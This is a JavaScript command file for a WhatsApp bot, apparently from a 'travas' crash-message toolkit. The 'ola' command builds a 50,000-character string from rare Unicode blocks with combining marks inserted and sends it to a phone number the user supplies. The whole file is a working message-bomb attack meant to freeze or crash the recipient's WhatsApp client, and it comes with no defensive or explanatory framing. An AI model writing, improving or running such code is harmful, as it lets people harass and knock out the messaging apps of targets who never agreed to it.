/* * 👑 MISA OLA - TRAvas System
 * Ruta: comandos/ola.js
 */

const handler = async (conn, m, { args, usedPrefix, command }) => {
    if (!args[0]) return m.reply(`✧ ‧₊˚ *MISA OLA* ୧ֹ˖\n\n> ✐ *Uso:* ${command} [número]`)
    let target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
    let cargaOla = ""
    for (let i = 0; i < 50000; i++) {
        let bloque = bloques[i % bloques.length]
        cargaOla += String.fromCodePoint(bloque + (i % 800))
        if (i % 8 === 0) cargaOla += String.fromCodePoint(0x0345) 
    }

    await conn.sendMessage(target, { text: cargaOla })
    await conn.sendMessage(m.chat, { react: { text: '🌊', key: m.key } })
}

handler.command = ['ola']
export default handler
